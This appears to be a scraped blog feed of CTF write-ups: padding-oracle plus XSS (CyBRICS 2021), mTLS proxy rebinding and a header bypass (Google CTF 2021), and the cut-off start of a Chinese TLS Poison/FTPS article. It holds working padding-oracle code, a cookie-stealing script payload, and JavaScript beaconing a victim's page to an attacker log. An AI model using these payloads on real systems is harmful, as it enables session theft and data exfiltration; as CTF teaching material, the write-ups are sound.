it does not solely provide intergrity protection. In other words, the attacker can modify the ciphertext (such as bit flipping) and send the modified ciphertext to the server without being noticed. This gives way to the padding oracle attack.\n Now, we can dive into the very details on how the padding oracle works.\nSuppose the attack has possession of a ciphertext which can be divided into an IV and 3 ciphertext blocks c1, c2, c3 . The purpose of the attacker is to decrypt the last ciphertext block c3.\nThe attacker changes the last byte of c2 (XORed with some value), and then send it to the server. The server responses with either a \u0026ldquo;PADDING_ERROR\u0026rdquo; response or a 500 status code reponse. If we gets a 500 status code response, we succeed. This implies that the unpadding check is passed, and the last plaintext block MUST end with b\u0026quot;\\x01, one of the 16 valid padding format.\n image-20210729175108696 \nAfter recovering the last byte, we can move on to decrypt all the previous bytes of the last plaintext block. For example, to decrypt the second last byte, we can utilize the b\u0026quot;\\x02\\x02\u0026quot; padding format. Since we already have had knowledge of the last byte of plaintext, we can modify the last byte into any value we want by XOR something in c2. At present, what we want is to make the last byte be b\u0026quot;\\x02\u0026quot;, we XOR the last byte of c2 with the last byte of plaintext to cancel it into b\u0026quot;\\x00\u0026quot;, then XOR in b\u0026quot;\\x02\u0026quot;, resulting to b\u0026quot;\\x02\u0026quot;. Then, try every 255 possible byte value guess_byte XOR b\u0026quot;\\x02\u0026quot; (except b\u0026quot;\\x00\u0026quot;) to XOR with the last second byte of c2, and send the modified ciphertext to the padding oracle until a 500 status code response, thus recovering the second last plaintext byte, which is exactly guess_byte.\nThe following is the Python code that can be used to, given ciphertext, recover the last plaintext block.\nimport requests import base64 import aztec_code_generator # padding_oracle recovers the last 16 plaintext bytes of the given ciphertext def padding_oracle(cipher): plaintext = b\u0026#34;\u0026#34; for index in range(1, 17): print(f\u0026#34;[*] index: {index}\u0026#34;) for byte in range(0, 256): bytes_xor = b\u0026#34;\\x00\u0026#34;*(16-index)+bytes([byte^index])+xor(plaintext,bytes([index]*(index-1))) new_cipher = cipher[:-32] + xor(cipher[-32:-16], bytes_xor) + cipher[-16:] b64data = base64.b64encode(new_cipher) code = aztec_code_generator.AztecCode(b64data) code.save(f\u0026#34;./pics/{byte}.png\u0026#34;, module_size=4) f = open(f\u0026#34;./pics/{byte}.png\u0026#34;, \u0026#34;rb\u0026#34;).read() paramsMultipart = [(\u0026#39;file\u0026#39;, (\u0026#39;1.png\u0026#39;, f, \u0026#39;application/png\u0026#39;))] response = session.post(\u0026#34;http://207.154.224.121:8080/upload\u0026#34;, files=paramsMultipart) if response.status_code == 200: body = response.content.split(b\u0026#39;\u0026lt;div class=\u0026#34;content__i\u0026#34;\u0026gt;\u0026#39;)[1].split(b\u0026#34;div\u0026#34;)[0] if b\u0026#34;PADDING\u0026#34; in response.content: print(f\u0026#34;[{byte:\u0026gt;3d}] Status code: {response.status_code}, PADDING ERROR\u0026#34;) else: print(f\u0026#34;[{byte:\u0026gt;3d}] Status code: {response.status_code}, {body}\u0026#34;) else:\t# response.status_code == 500 print(f\u0026#34;[{byte:\u0026gt;3d}] Status code: {response.status_code}\u0026#34;) plaintext = bytes([byte]) + plaintext print(f\u0026#34;plaintext: {plaintext}\u0026#34;) break return plaintext Recovering the Entire Plaintext By exploting the padding oracle, we are enabled to decrypt the last plaintext block byte by byte. Can we go any further? The answer is yes.\nOnce we have recovered the last plaintext block, we can drop the last ciphertext block, and continue to exploit the padding oracle to recover the second last plaintext block. Keep doing this, and we will recover all the plaintext blocks, namely the entire plaintext.\n In practice, we implemented the attack and succssfully recovered the entire plaintext, which was a json formatted data.\nb\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;12321\u0026#34;, \u0026#34;surname\u0026#34;: \u0026#34;123\u0026#34;, \u0026#34;middle\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;time\u0026#34;: \u0026#34;2021-07-26 13:37:00\u0026#34;, \u0026#34;dest\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;dep\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;flight\u0026#34;: \u0026#34;BLZH1337\u0026#34;}\\x02\\x02\u0026#39; At this point, we got to know how the server side might process the uploaded aztec code. After receiving the code, the server decoded it into ciphertext, decrypted the ciphertext, and unpadded the decryption result. If something wrong happened during unpadding, the server replied with a \u0026ldquo;PADDING_ERROR\u0026rdquo; response. After unpadding, the plaintext was then unmarshaled into an object (by something like JSON.parse()). If any error occurred, the server replied with a 500 status code response. The server would send back us a \u0026ldquo;Success\u0026rdquo; response if everything\u0026rsquo;s ok.\nArbitrary Plaintext Encryption Recovering the entire plaintext is not enough to solve this challenge. We can go more further to craft the ciphertext of arbitrary plaintext that we want.\nTo achieve this goal, we need to combine bit flip attack with the padding oracle attack. Bit flip attack enables us to change the plaintext into what we want, and the padding oracle attack functions as a decryption oracle to help us decrypt any ciphertext.\nSay the ciphertext IV || c1 || c2 || c3 decrypts into p1 || p2 || p3, and we want to get the ciphertext of p1' || p2' || p3.\n image-20210729181535279 \nWe first XOR c1 with p2 XOR p2' to get c1'. In this way, IV || c1' || c2 || c3  will be decrypted into junk || p2' || p3.\n image-20210729181301243 \nThe nasty junk block consists of random byte values, which is unknown to us, and the decryption result cannot be parsed correctly by JSON.parse(). What we can do with it? Remember the padding oracle attack to recover the last plaintext block? Yes, we can reuse the padding oracle attack to recover the junk block. After that, we XOR IV with junk XOR p1' to get a new IV'. In this way, IV' || c1' || c2 || c3 will be decrypted into p1' || p2' || p3, which is exactly we want!\n image-20210729182312222 \nThe XSS Part So we could encrypt what we want now. What should we do next? According to the description of the challenge, we have to go and get the content of the central surveillance system to get the information of Mr.Flag Flagger. But how?\nLet\u0026rsquo;s take a look at the json. There may be a bot in the backend use JSON.parse() to parse the json and some method to render a page with these json data. For example, res.render(\u0026quot;render.html\u0026quot;, name=json.name, surname=json.surname). So we could try to inject a XSS vector into the plaintext, encrypt it and then send the payload to the bot through the upload API.\nBut, at first we need to understand the correspondence between API parameters and JSON parameters. After do a test, we generate a ciphertext through the /finalize API and decrypt the ciphertext to get the correspondence.\nURL: http://207.154.224.121:8080/finalize?lastName=1\u0026amp;firstName=2\u0026amp;origin=3\u0026amp;Gender=4\u0026amp;destination=5 CipherText: 8BAHi37U69MYAnP4O4cHrpRIJrT3dKwv7uRCoLYzU2vnxEOCb6vT0LffcAROX3jPZ+p4yDtKRXwcxYF9B22a3PH3m9tIiEDc3OrwR9W/ACyIcPw7XEJKAyB3QlHiFn2j0HC8P8SpwFqe4A/NRCESLI996IzP9Rkw066eGSuK0MxhpBXGV2gqfm4FAgqTLE3N PlainText: b'{\u0026quot;name\u0026quot;: \u0026quot;2\u0026quot;, \u0026quot;surname\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;middle\u0026quot;: \u0026quot;4\u0026quot;, \u0026quot;time\u0026quot;: \u0026quot;2021-07-26 13:37:00\u0026quot;, \u0026quot;dest\u0026quot;: \u0026quot;5\u0026quot;, \u0026quot;dep\u0026quot;: \u0026quot;3\u0026quot;, \u0026quot;flight\u0026quot;: \u0026quot;BLZH1337\u0026quot;}' Okay. But which one we should inject the XSS vector? You could try one by one but I think there is a hint in the source code of the challenge.\n\u0026lt;!-- \u0026lt;h2\u0026gt;Passenger data\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;Name:\u0026lt;/h3\u0026gt; \u0026lt;h4\u0026gt;qweqwe\u0026lt;/h4\u0026gt; --\u0026gt; It looks like the Name is what we want. So we should craft a payload like this.\n{\u0026#34;name\u0026#34;: \u0026#34;\u0026lt;script src=http://your_url/?2\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;, \u0026#34;surname\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;middle\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;time\u0026#34;: \u0026#34;2021-07-26 13:37:00\u0026#34;, \u0026#34;dest\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;dep\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;flight\u0026#34;: \u0026#34;BLZH1337\u0026#34;} When we generate the ciphertext, we first need to generate a cipher whose the length of the name parameter is the same length as the name parameter in the XSS payload we constructed. In this exmaple, the name is \u0026lt;script src=http://your_url/?2\u0026gt;\u0026lt;/script\u0026gt; and its length is 40. Therefore, we should generate a ciphertext with a name of length 40 through the /finalize API. And we\u0026rsquo;d better leave the other parameters as default values.\nURL: http://207.154.224.121:8080/finalize?lastName=1\u0026amp;firstName=0000000000000000000000000000000000000000\u0026amp;origin=3\u0026amp;Gender=4\u0026amp;destination=5 PlainText: b'{\u0026quot;name\u0026quot;: \u0026quot;0000000000000000000000000000000000000000\u0026quot;, \u0026quot;surname\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;middle\u0026quot;: \u0026quot;4\u0026quot;, \u0026quot;time\u0026quot;: \u0026quot;2021-07-26 13:37:00\u0026quot;, \u0026quot;dest\u0026quot;: \u0026quot;5\u0026quot;, \u0026quot;dep\u0026quot;: \u0026quot;3\u0026quot;, \u0026quot;flight\u0026quot;: \u0026quot;BLZH1337\u0026quot;}' After we get the ciphertext, we need to change the plaintext of the ciphertext using padding oracle and bit flipping. And then use base64 and aztec code to encode the ciphertext and upload the aztec code. At last, XSS fires!  \nNow, we get the admin\u0026rsquo;s cookie and the source code of the admin\u0026rsquo;s page. After having used the cookie to visit the page as admin, we found the page only had a search function. I thought I needed to do SQL injection to get the flag. But at last, we just searched \u0026lsquo;Flagger\u0026rsquo; as described in the challenge and got the flag.\n \nThanks for your reading. Hope you like the writeup! XD\n","date":"2021-08-02T00:32:27Z","permalink":"https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/","title":"Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)"},{"content":"I played Google CTF Quals 2021 and here is my writeup.\nI played with the Tea Deliverers team in the Google CTF Quals 2021. We sovled 2 webs in Google CTF 2021 quals but I think I have only made a small contribution. In the end, we got 11th rank, sadly I couldn\u0026rsquo;t do much. Hope I could do more in the next time!\n \nOK. Let\u0026rsquo;s talk about the CTF.\nEmpty LS There is a web challenge called empty ls. This challenge examines a security risk in the MTLS scenario. We could get the following information from the challenge:\n  There is a website https://www.zone443.dev/. Two primary services are offered on this website.\n   This website provides a user registration service and offers user\u0026rsquo;s certificates for download. You could register a user and get a client certificate for your identity. Another service is that it also provides a subdomain registration service. You could register a subdomain under zone443.dev and set an A record to an IP. So it means you could get a sub-domain that is entirely under your control.    The challenge provides an example code and a client CA cert which could be used to verify users. Besides, you could report an URL, and the admin will check it.\n  There is another website https://admin.zone443.dev. If you visit the admin\u0026rsquo;s website with your certificate, it will return \u0026lsquo;Hello, user. You are not the admin.\u0026rsquo; The \u0026lsquo;user\u0026rsquo; is exactly your username when you registered on www.zone443.dev.\n  So, obviously, we need to access this site as admin or steal the response when the admin visits the admin.zone443.dev in some way.\nAt first, I came up with an idea. Maybe we could steal the admin\u0026rsquo;s client certificate when the admin visits our website. After we get the admin\u0026rsquo;s certificate, we could try to use it to forge as admin and visit the admin.zone443.dev. But the idea is too naive. After I learn about some docs about MTLS, this may be impossible. So I get stuck.\nAlthough the above idea doesn\u0026rsquo;t work, I think we are still on the right way. At least, our target in this challenge is much more evident than the target in letschat. (In the challenge letschat, we even don\u0026rsquo;t know what the target is, where the flag is and what we should access).\nAfter a few hours, we found an interesting point. The certificate of the admin.zone443.dev is the wildcard. It is *.zone443.dev. But what does it mean? Then I tried to google \u0026lsquo;HTTPS wildcard certificate\u0026rsquo; and \u0026lsquo;TLS client auth bypass\u0026rsquo;. The bad news is I couldn\u0026rsquo;t get anything helpful to solve the challenge.\nWe are stuck again until we came up with another idea. In the period, we also found that admin.zone443.dev doesn\u0026rsquo;t check the host. So this means there will be no warnings if you visit a subdomain whose A record is 34.140.9.160(the A record of admin.zone443.dev). That\u0026rsquo;s an interesting phenomenon.\nOK. Let\u0026rsquo;s talk about XSS. If we want to read the content of the admin\u0026rsquo;s page, we need XSS. But if we\u0026rsquo;re going to XSS on our subdomain to read the content of the admin\u0026rsquo;s page, we need to break the same-origin policy. Is it really a way using a feature of HTTPS we don\u0026rsquo;t know to bypass the same-origin policy?\nBased on the question, we thought, how about DNS Rebinding? But there are quite a few limitations. The max execution time of the bot\u0026rsquo;s chrome is about 10s, but the time of chrome\u0026rsquo;s DNS cache is 60s. You can\u0026rsquo;t set two A records when you register your subdomain, either.\nIt seems we are stuck again. All right.\nLet\u0026rsquo;s review the whole challenge. Do you still remember we could take all control of a subdomain? Yeah. It means we could do what we want to do on it. So what about traffic forwarding? If we forward the traffic to admin.zone443.dev when the admin visits our website, what do you think will happen next? The response is from admin.zone443.dev, but the domain is our domain!\nWhy? As we said above, the certificate of admin.zone443.dev is wildcard, and it ignores the host header in HTTP, so there will be no warnings and no errors in this period. What\u0026rsquo;s more, for admin, he actually visits admin.zone443.dev with his certificate, and for browser, it thinks the domain admin visits is our domain. So, in this scenario, if we send an AJAX request to request the admin\u0026rsquo;s response on our domain, the browser will think this request doesn\u0026rsquo;t violate the same-origin policy. Because the domain which admin visit is our domain, the domain which AJAX requests is also our domain.\nIt makes sense! Quite like a variant DNS Rebinding. The process of the exploit is as follows.\n Register a subdomain through the subdomain registration service, which is provided by the challenge. Report your subdomain to admin. The admin\u0026rsquo;s browser makes the first request. At this time, the admin will visit your site and execute javascript on your page. The JS code will make an AJAX request to your subdomain. The second request is made by AJAX. You should forward the traffic to admin.zone443.dev at this time. In the end, after you get the response from AJAX, send the response to your HTTP log in some way, and you could get the flag.  That\u0026rsquo;s all the process to solve the challenge. We write a go server to forward the traffic. Thanks to my great teammate.\npackage main import ( \u0026#34;crypto/tls\u0026#34; \u0026#34;crypto/x509\u0026#34; \u0026#34;encoding/pem\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;github.com/valyala/fasthttp\u0026#34; \u0026#34;golang.org/x/sync/errgroup\u0026#34; ) // clientCAPool consructs a CertPool containing the client CA. func clientCAPool()( * x509.CertPool, error) { caCertPem, err: = ioutil.ReadFile(\u0026#34;clientca.crt.pem\u0026#34;) if err != nil { return nil, fmt.Errorf(\u0026#34;error reading clientca cert: %v\u0026#34;, err) } caCertBlock, rest: = pem.Decode(caCertPem) if caCertBlock == nil || len(rest) \u0026gt; 0 { return nil, fmt.Errorf(\u0026#34;error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d\u0026#34;, caCertBlock, len(rest)) } if caCertBlock.Type != \u0026#34;CERTIFICATE\u0026#34; { return nil, fmt.Errorf(\u0026#34;clientca cert had a bad type: %s\u0026#34;, caCertBlock.Type) } caCert, err: = x509.ParseCertificate(caCertBlock.Bytes) if err != nil { return nil, fmt.Errorf(\u0026#34;error parsing clientca cert ASN.1 DER: %v\u0026#34;, err) } cas: = x509.NewCertPool() cas.AddCert(caCert) return cas, nil } func servePage(conn net.Conn) error { log.Printf(\u0026#34;serve page\u0026#34;) clientCA, err: = clientCAPool() if err != nil { return err } serverCert, err: = tls.LoadX509KeyPair(\u0026#34;fullchain.pem\u0026#34;, \u0026#34;privkey.pem\u0026#34;) if err != nil { return err } tlsConn: = tls.Server(conn, \u0026amp; tls.Config { Certificates: [] tls.Certificate { serverCert }, ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: clientCA, }) err = tlsConn.Handshake() if err != nil { return err } srv: = fasthttp.Server { DisableKeepalive: true, Handler: fasthttp.FSHandler(\u0026#34;static\u0026#34;, 0), } return srv.ServeConn(tlsConn) } func serveProxy(conn net.Conn) error { next, err: = net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;admin.zone443.dev:443\u0026#34;) if err != nil { return err } var group errgroup.Group group.Go(func() error { _, err: = io.Copy(conn, next) return err }) group.Go(func() error { _, err: = io.Copy(next, conn) return err }) return group.Wait() } func main() { lis, err: = net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:https\u0026#34;) if err != nil { log.Fatalf(\u0026#34;Failed to listen: %v\u0026#34;, err) } count: = 0 for { conn, err: = lis.Accept() if err != nil { log.Fatalf(\u0026#34;Failed to accept: %v\u0026#34;, err) } count++ if count == 1 { go func() { err: = servePage(conn) if err != nil { log.Printf(\u0026#34;Failed to serve page: %v\u0026#34;, err) } }() } else { go func() { err: = serveProxy(conn) if err != nil { log.Printf(\u0026#34;Failed to serve proxy: %v\u0026#34;, err) } }() } } } The javascript code is something like this.\nvar xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { navigator.sendBeacon(\u0026#39;https://http_log\u0026#39;, this.responseText) }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;/\u0026#34;, true); xhttp.withCredentials = true; xhttp.send(); At last, we got the flag. Pretty cool, man!\n \nGPU Shop This challenge has an environment that is so complex that I don\u0026rsquo;t know how to explain it. I want to try my best to describe the setting of the challenge in short.\nThe challenge provides two services.\n The first service is a reverse proxy service https://paymeflare-web.2021.ctfcompetition.com. After you log in to this site with your Google account, you could set some settings according to the document.  The reverse proxy will set an HTTP header x-pay and visit your IP. If you want to visit the URL which has \u0026lsquo;checkout\u0026rsquo;, the proxy will add an HTTP header \u0026lsquo;X-Wallet\u0026rsquo;.   There is another service http://gpushop.2021.ctfcompetition.com. This website uses the paymeflare service as the reverse proxy. You could buy the flag on this website.     When you try to buy the flag, it will get the eth address from the HTTP header \u0026lsquo;X-Wallet\u0026rsquo;. Request the balance of the eth address through cloudflare-eth.com. If your balance is greater than your cost, you will get the flag.    We don\u0026rsquo;t know how to solve the challenge, so we ask our boss to get a pretty rich eth address and buy the flag in the end.\nAlthough there are many proxies in the challenge, we could use URLEncode to bypass the \u0026lsquo;checkout\u0026rsquo; limitation, and the backend will not get the \u0026lsquo;X-Wallet\u0026rsquo; header. The GPU shop will get a pretty rich eth address because of the code used in gpushop.\nfunction format_addr($addr) { return \u0026#39;0x\u0026#39;.str_pad($addr, 40, \u0026#39;0\u0026#39;, STR_PAD_LEFT); } $order-\u0026gt;wallet = $this-\u0026gt;format_addr($request-\u0026gt;header(\u0026#39;X-Wallet\u0026#39;)); When the header \u0026lsquo;X-Wallet\u0026rsquo; is not set, the value of $order-\u0026gt;wallet is 0x0000000000000000000000000000000000000000 and the balance of this address is 0x1c923afe206b9068f3f which is greater than the cost of flag 1537550000000000000000. So we could buy the flag.\n \nOther Webs There are other two webs. One of them is callled letschat. In this challenge, you need to do a lot of brainstorming, and we take pretty much time to solve this challenge but still fail in the end. Although the intended solution is to predict the UUID of the message, I realized that some teams bruted the UUID to get the flag. Mmm, this really makes me mad. It\u0026rsquo;s too guessy and pretty annoying. I initially thought this challenge was inspired by some slack\u0026rsquo;s vulnerabilities from the real world, but the intended solution beat me.\nThe last web is an XSS challenge created by @terjanq. Pretty cool and amazing. You could read this simple solution written by him.\nThanks for reading. Hope my bad English has not affected your reading of this article. :\u0026gt;\n","date":"2021-07-21T02:58:54Z","permalink":"https://blog.zeddyu.info/2021/07/21/google-qual-2021/","title":"Two Webs' Writeup in Google CTF Quals 2021"},{"content":"æœ€è¿‘æ€»ç»“æ•´ç†äº† TLS Poison æ”»å‡»ç›¸å…³çš„çŸ¥è¯†ï¼Œæœ¬æ–‡ä¼šç»§ç»­è®² TLS Poison åˆ©ç”¨ï¼Œä»¥åŠå…¶åœ¨ CTF çš„å®é™…è¿ç”¨ï¼Œä¹Ÿé€šè¿‡è¿™ä¸ªé¢˜ç›®æ¥èŠèŠ FTPS ç›¸å…³çŸ¥è¯†ã€‚\næ–‡ç« é¦–å‘äºé•¿äº­å®‰å…¨è¯¾å ‚ï¼šTLS-Poison æ”»å‡»æ–¹å¼åœ¨çœŸå®CTFèµ›é¢˜ä¸­çš„åˆ©ç”¨å®è·µ https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ\n PS: åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰ï¼Œå»ºè®®æ‚¨æŒæ¡ç›¸å…³çš„ TLS Poison å…ˆéªŒçŸ¥è¯†ï¼Œæœ¬æ–‡ä¸ä¼šå†é‡æ–°è¯¦ç»†ä»‹ç» TLS Poison æ”»å‡»çš„åŸºç¡€çŸ¥è¯†\næˆ‘ä»¬é¦–å…ˆå†æ¥å›é¡¾ Black Hat è¿™ä¸ªè®®é¢˜ï¼Œä¸ºä»€ä¹ˆä½œè€…ä½¿ç”¨çš„æ˜¯ When TLS Hacks You å‘¢ï¼Ÿè€Œä¸æ˜¯ When HTTPS Hack You ï¼Œè¯´æ˜è¿™ä¸ªé—®é¢˜æ˜¯å‡ºç°åœ¨ TLS ç‰¹æ€§èº«ä¸Šï¼Œæ‰€ä»¥ç›®å‰æˆ‘ä»¬è²Œä¼¼éƒ½æ›´å¤šåªå±€é™åœ°ä¸“æ³¨åœ¨ HTTPS ä¸Šï¼Œè¿™æ˜¯æ¯”è¾ƒç‹­éš˜çš„è€ƒè™‘ã€‚æ—¢ç„¶å¦‚æ­¤ï¼ŒHTTPS æ˜¯ HTTP over TLS ï¼Œé‚£å…¶ä»–åè®®æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å‘¢ï¼Ÿæ¯”å¦‚ FTPS ï¼ŒFTP over TLS ç­‰ç­‰ï¼Ÿé‚£æˆ‘ä»¬æ¥çœ‹çœ‹ FTPS å¯ä»¥å¦‚ä½•ä½¿ç”¨ã€‚\nIntroduction of FTPS  â€‹\tFTPS (also known FTP-SSL, and FTP Secure) is an extension to the commonly used File Transfer Protocol (FTP) that adds support for the Transport Layer Security (TLS) and, formerly, the Secure Sockets Layer (SSL, which is now prohibited by RFC7568) cryptographic protocols.\nFTPS should not be confused with the SSH File Transfer Protocol (SFTP), a secure file transfer subsystem for the Secure Shell (SSH) protocol with which it is not compatible. It is also different from FTP over SSH, which is the practice of tunneling FTP through an SSH connection.\n é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹ FTPS ï¼ŒFTPS æ˜¯ä¸€ç§å¯¹å¸¸ç”¨çš„æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFTPï¼‰æ·»åŠ ä¼ è¾“å±‚å®‰å…¨ï¼ˆTLSï¼‰å’Œå®‰å…¨å¥—æ¥å±‚ï¼ˆSSLï¼‰åŠ å¯†åè®®æ”¯æŒçš„æ‰©å±•åè®®ã€‚\nåœ¨ HTTPS æ¨ªç©ºå‡ºä¸–ä¹‹åï¼ŒSSL åè®®ä¹Ÿåº”ç”¨åˆ°äº† FTP ä¸Šï¼Œéšååœ¨ 1996 å‘å¸ƒäº† FTPS çš„ä¸€ä¸ªè‰æ¡ˆ Secure FTP over SSL ï¼Œä½†æ˜¯ç›´åˆ° 2005 å¹´æ‰æœ€ç»ˆç¡®å®šç»ˆç¨¿ RFC 4217 - Securing FTP with TLS ã€‚ç„¶è€Œå®é™…ä¸Šï¼ŒFTPS æ‹¥æœ‰ä¸¤ç§æ¨¡å¼ï¼Œè¿™é‡Œå¹¶éæŒ‡çš„æ˜¯ FTP çš„ä¸»åŠ¨ã€è¢«åŠ¨æ¨¡å¼ï¼Œè€Œæ˜¯æ˜¾å¼ã€éšå¼æ¨¡å¼ã€‚\nImplicit Mode åœ¨éšå¼æ¨¡å¼ä¸‹ï¼ŒFTPS çš„é»˜è®¤ç«¯å£åœ¨ 990 ç«¯å£ä¸Šï¼Œéšå¼æ¨¡å¼ä¸‹æ‰€æœ‰çš„è¿æ¥æ•°æ®å‡ä¸ºåŠ å¯†ã€‚\nå®¢æˆ·ç«¯å¿…é¡»å…ˆä½¿ç”¨ TLS Client Hello æ¶ˆæ¯å‘ FTPS æœåŠ¡å™¨è¿›è¡Œæ¡æ‰‹æ¥åˆ›å»ºåŠ å¯†è¿æ¥ï¼Œå¦‚æœ FTPS æœåŠ¡å™¨æœªæ”¶åˆ°æ­¤ç±»æ¶ˆæ¯ï¼Œåˆ™æœåŠ¡å™¨åº”æ–­å¼€è¿æ¥ã€‚ ä¸ºäº†ä¿æŒä¸ç°æœ‰çš„é FTPS æ„ŸçŸ¥å®¢æˆ·ç«¯çš„å…¼å®¹æ€§ï¼Œéšå¼ FTPS é»˜è®¤åœ¨ IANA è§„å®šçš„ç«¯å£ 990/TCP ä¸Šç›‘å¬ FTPS æ§åˆ¶é€šé“ï¼Œå¹¶åœ¨ç«¯å£ 989/TCP ä¸Šç›‘å¬ FTPS æ•°æ®é€šé“ã€‚è¿™ä½¿å¾—ç®¡ç†å‘˜å¯ä»¥ä¿ç•™ç«¯å£(æ§åˆ¶é€šé“ 21/TCP ä¸æ•°æ®é€šé“ 20/TCP )ä»¥å…¼å®¹åŸå§‹çš„FTPã€‚\nè™½ç„¶æˆ‘æ²¡æœ‰æŸ¥æ‰¾åˆ°éšå¼ FTPS çš„ç›¸å…³å†å²ï¼Œä½†æ˜¯æˆ‘ä¸ªäººè§‰å¾—ä»–æ›´åƒåœ¨ SSL æ—¶ä»£åº”è¿è€Œç”Ÿçš„äº§ç‰©ï¼Œæ›´ç¬¦åˆäº† FTP over SSL çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹ä½¿ç”¨ TLS/SSL è¿›è¡Œä¼šè¯åˆ›å»ºï¼Œå†è¿›è¡Œæ•°æ®åŠ å¯†ä¼ è¾“ã€‚ä½† RFC 4217 ä¸­æœªå®šä¹‰éšå¼æ¨¡å¼ï¼Œå› æ­¤å®ƒä¹Ÿè¢«è®¤ä¸ºæ˜¯FTPåå•†TLS/SSLä¸­è¿‡æ—¶çš„æ—©æœŸæ–¹æ³•ã€‚\n \nExplicit Mode åœ¨æ˜¾å¼æ¨¡å¼ï¼ˆä¹Ÿç§°ä¸ºFTPESï¼‰ä¸‹ï¼ŒFTPS å®¢æˆ·ç«¯å…ˆä¸æœåŠ¡å™¨åˆ›å»ºæ˜æ–‡è¿æ¥ï¼Œç„¶åä»æ§åˆ¶é€šé“æ˜ç¡®è¯·æ±‚æœåŠ¡ç«¯å‡çº§ä¸ºåŠ å¯†è¿æ¥ï¼ˆå‘½ä»¤ä¸º: AUTH TLSï¼‰ã€‚æ§åˆ¶é€šé“ä¸æ•°æ®é€šé“é»˜è®¤ç«¯å£ä¸åŸå§‹ FTP ä¸€æ ·ä¹Ÿæ˜¯ 21 ç«¯å£ã€‚æ§åˆ¶é€šé“å§‹ç»ˆåŠ å¯†ï¼Œè€Œæ•°æ®é€šé“æ˜¯å¦åŠ å¯†åˆ™ä¸ºå¯é€‰é¡¹ã€‚ åŒæ—¶è‹¥æœåŠ¡å™¨æœªé™åˆ¶æ˜æ–‡è¿æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœªåŠ å¯†çš„åŸå§‹ FTP è¿›è¡Œè¿æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨åœ¨ç›¸åŒçš„ç«¯å£ä¸ŠåŒæ—¶æä¾› FTP ä¸ FTPS æœåŠ¡ã€‚\nä¸FTPåå•†è®¤è¯å’Œå®‰å…¨çš„æœºåˆ¶æ˜¯åœ¨ RFC 2228 ä¸‹å¢åŠ çš„ï¼Œå…¶ä¸­åŒ…æ‹¬æ–°çš„ FTP å‘½ä»¤ AUTH ã€‚è™½ç„¶è¯¥ RFC æ²¡æœ‰æ˜ç¡®å®šä¹‰ä»»ä½•æ‰€éœ€çš„å®‰å…¨æœºåˆ¶ï¼Œå¦‚ SSL æˆ– TLS ï¼Œä½†å®ƒç¡®å®è¦æ±‚ FTPS å®¢æˆ·ç«¯ç”¨ä¸€ä¸ªåŒæ–¹éƒ½çŸ¥é“çš„æœºåˆ¶æŒ‘æˆ˜ FTPS æœåŠ¡å™¨ã€‚å¦‚æœ FTPS å®¢æˆ·ç«¯ç”¨ä¸€ä¸ªæœªçŸ¥çš„å®‰å…¨æœºåˆ¶æŒ‘æˆ˜ FTPS æœåŠ¡å™¨ï¼Œ FTPS æœåŠ¡å™¨å°†ä»¥é”™è¯¯ä»£ç  504ï¼ˆä¸æ”¯æŒï¼‰å“åº” AUTH å‘½ä»¤ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡ä½¿ç”¨ FEAT å‘½ä»¤æŸ¥è¯¢ FTPS æœåŠ¡å™¨æ¥ç¡®å®šæ”¯æŒå“ªäº›æœºåˆ¶ï¼Œå°½ç®¡æœåŠ¡å™¨ä¸ä¸€å®šéœ€è¦è¯šå®åœ°æŠ«éœ²å®ƒä»¬æ”¯æŒå“ªäº›å®‰å…¨çº§åˆ«ã€‚è°ƒç”¨ FTPS å®‰å…¨çš„å¸¸è§æ–¹æ³•åŒ…æ‹¬ AUTH TLS å’Œ AUTH SSL ã€‚æ˜¾å¼æ–¹æ³•åœ¨ RFC 4217 ä¸­å®šä¹‰åï¼ŒFTPSçš„åˆè§„æ€§è¦æ±‚å®¢æˆ·ç«¯å§‹ç»ˆä½¿ç”¨ AUTH TLS æ–¹æ³•è¿›è¡Œåå•†ã€‚\n \næˆ‘ä»¬å¯ä»¥åœ¨ RFC 4217 ä¸­æ‰¾åˆ°æ˜¾å¼ FTPS å»ºç«‹è¿æ¥æ–¹å¼ï¼š\n Client Server control data data control ==================================================================== socket() bind() socket() connect() ----------------------------------------------\u0026gt; accept() \u0026lt;---------------------------------------------- 220 AUTH TLS ----------------------------------------------\u0026gt; \u0026lt;---------------------------------------------- 234 TLSneg() \u0026lt;----------------------------------------------\u0026gt; TLSneg() PBSZ 0 ----------------------------------------------\u0026gt; \u0026lt;---------------------------------------------- 200 PROT P ----------------------------------------------\u0026gt; \u0026lt;---------------------------------------------- 200 USER fred ----------------------------------------------\u0026gt; \u0026lt;---------------------------------------------- 331 PASS pass ----------------------------------------------\u0026gt; \u0026lt;---------------------------------------------- 230 Note 1: The order of the PBSZ/PROT pair and the USER/PASS pair (with respect to each other) is not important (i.e., the USER/PASS can happen prior to the 